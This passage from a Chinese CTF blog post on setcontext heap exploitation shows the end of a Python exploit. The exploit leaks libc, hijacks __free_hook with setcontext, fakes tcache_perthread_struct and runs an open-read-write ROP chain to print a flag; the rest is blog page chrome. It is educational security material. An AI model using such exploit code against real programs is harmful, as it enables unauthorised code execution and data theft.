class="number">0x23</span>+<span class="string">b&#x27;\x07&#x27;</span>) <span class="comment"># 0x240</span></span><br><span class="line"></span><br><span class="line">    free()</span><br><span class="line">    show()</span><br><span class="line">    ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    libc_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">    </span><br><span class="line">    pop_rdi = <span class="number">0x00000000000215bf</span> + libc_base</span><br><span class="line">    pop_rsi = <span class="number">0x0000000000023eea</span> + libc_base</span><br><span class="line">    pop_rdx = <span class="number">0x0000000000001b96</span> + libc_base</span><br><span class="line">    pop_rax = <span class="number">0x0000000000043ae8</span> + libc_base</span><br><span class="line">    syscall = <span class="number">0x00000000000d2745</span> + libc_base</span><br><span class="line">    ret = <span class="number">0x00000000000008aa</span> + libc_base</span><br><span class="line"></span><br><span class="line">    setcontext = libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span> + libc_base</span><br><span class="line">    free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + libc_base</span><br><span class="line"></span><br><span class="line">    flag = heap_base + <span class="number">0x1000</span></span><br><span class="line">    stack_1 = heap_base + <span class="number">0x2000</span></span><br><span class="line">    stack_2 = heap_base + <span class="number">0x20a0</span></span><br><span class="line">    orw_1 = heap_base + <span class="number">0x3000</span></span><br><span class="line">    orw_2 = heap_base + <span class="number">0x3060</span></span><br><span class="line"></span><br><span class="line">    orw = p64(pop_rdi) + p64(flag)</span><br><span class="line">    orw += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">    orw += p64(pop_rax) + p64(<span class="number">2</span>)</span><br><span class="line">    orw += p64(syscall)</span><br><span class="line"></span><br><span class="line">    orw += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">    orw += p64(pop_rsi) + p64(heap_base + <span class="number">0x4000</span>)</span><br><span class="line">    orw += p64(pop_rdx) + p64(<span class="number">0x30</span>)</span><br><span class="line">    orw += p64(pop_rax) + p64(<span class="number">0</span>)</span><br><span class="line">    orw += p64(syscall)</span><br><span class="line"></span><br><span class="line">    orw += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">    orw += p64(pop_rsi) + p64(heap_base + <span class="number">0x4000</span>)</span><br><span class="line">    orw += p64(pop_rdx) + p64(<span class="number">0x30</span>)</span><br><span class="line">    orw += p64(pop_rax) + p64(<span class="number">1</span>)</span><br><span class="line">    orw += p64(syscall)</span><br><span class="line"></span><br><span class="line">    pd = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x40</span></span><br><span class="line">    pd += p64(free_hook) <span class="comment"># 0x20</span></span><br><span class="line">    pd += p64(flag)      <span class="comment"># 0x30</span></span><br><span class="line">    pd += p64(<span class="number">0</span>)         <span class="comment"># 0x40</span></span><br><span class="line">    pd += p64(stack_1)   <span class="comment"># 0x50</span></span><br><span class="line">    pd += p64(stack_2)   <span class="comment"># 0x60</span></span><br><span class="line">    pd += p64(orw_1)     <span class="comment"># 0x70</span></span><br><span class="line">    pd += p64(orw_2)     <span class="comment"># 0x80</span></span><br><span class="line"></span><br><span class="line">    edit(pd)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x10</span>)</span><br><span class="line">    edit(p64(setcontext))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x20</span>)</span><br><span class="line">    edit(<span class="string">b&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x50</span>)</span><br><span class="line">    edit(p64(orw_1)+p64(ret))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x60</span>)</span><br><span class="line">    edit(orw[:<span class="number">0x60</span>])</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x70</span>)</span><br><span class="line">    edit(orw[<span class="number">0x60</span>:])</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x40</span>)</span><br><span class="line">    free()</span><br><span class="line">    </span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+ 
+   <div>
+     <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:24px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+   </div>
+ 
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="肥柴 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>肥柴
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2024/07/09/%E5%88%9D%E8%AF%86setcontext/" title="初识setcontext">http://example.com/2024/07/09/初识setcontext/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/orw/" rel="tag"># orw</a>
+              <a href="/tags/setcontext/" rel="tag"># setcontext</a>
+              <a href="/tags/unsortbin-attack/" rel="tag"># unsortbin attack</a>
+              <a href="/tags/tcache-perthread-struct/" rel="tag"># tcache_perthread_struct</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/06/08/%E5%85%B3%E4%BA%8Efastbin%E7%9A%84%E8%8C%83%E5%9B%B4%E5%8F%82%E8%80%83/" rel="prev" title="关于fastbin的范围参考">
+      <i class="fa fa-chevron-left"></i> 关于fastbin的范围参考
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+    <!-- require APlayer -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    <!-- require MetingJS-->
+    <script src="https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js"></script> 
+    <!--网易云-->   
+    <meting-js
+      server="netease"
+      id="2840267056"
+	    type="playlist" 
+	    mini="false"
+      fixed="false"
+      list-folded="true"
+      autoplay="true"
+      volume="0.4"
+      theme="#FADFA3"
+      order="random"
+	    loop="all"
+      preload="auto"
+      mutex="true">
+    </meting-js>
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#tcache-perthread-struct"><span class="nav-number">1.1.</span> <span class="nav-text">tcache_perthread_struct</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#setcontext"><span class="nav-number">1.2.</span> <span class="nav-text">setcontext</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#uaf%E6%B3%84%E9%9C%B2heap%E5%9F%BA%E5%9D%80"><span class="nav-number">2.</span> <span class="nav-text">uaf泄露heap基址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0tcache-perthread-struct"><span class="nav-number">3.</span> <span class="nav-text">伪造tcache_perthread_struct</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gadgets"><span class="nav-number">4.</span> <span class="nav-text">gadgets</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#orw-ROP"><span class="nav-number">5.</span> <span class="nav-text">orw ROP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E7%BD%AEpayload"><span class="nav-number">6.</span> <span class="nav-text">布置payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="nav-number">7.</span> <span class="nav-text">完整exp</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="肥柴"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">肥柴</p>
+  <div class="site-description" itemprop="description">柴柴就是世界第一可爱！！!</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ccjssjdyka" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ccjssjdyka" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1351994205@qq.com" title="E-Mail → mailto:1351994205@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://baidu.com/" title="https:&#x2F;&#x2F;baidu.com" rel="noopener" target="_blank">百度</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; Fri Oct 06 2023 08:00:00 GMT+0800 (中国标准时间) – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">肥柴</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">63k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">57 分钟</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
+</html>
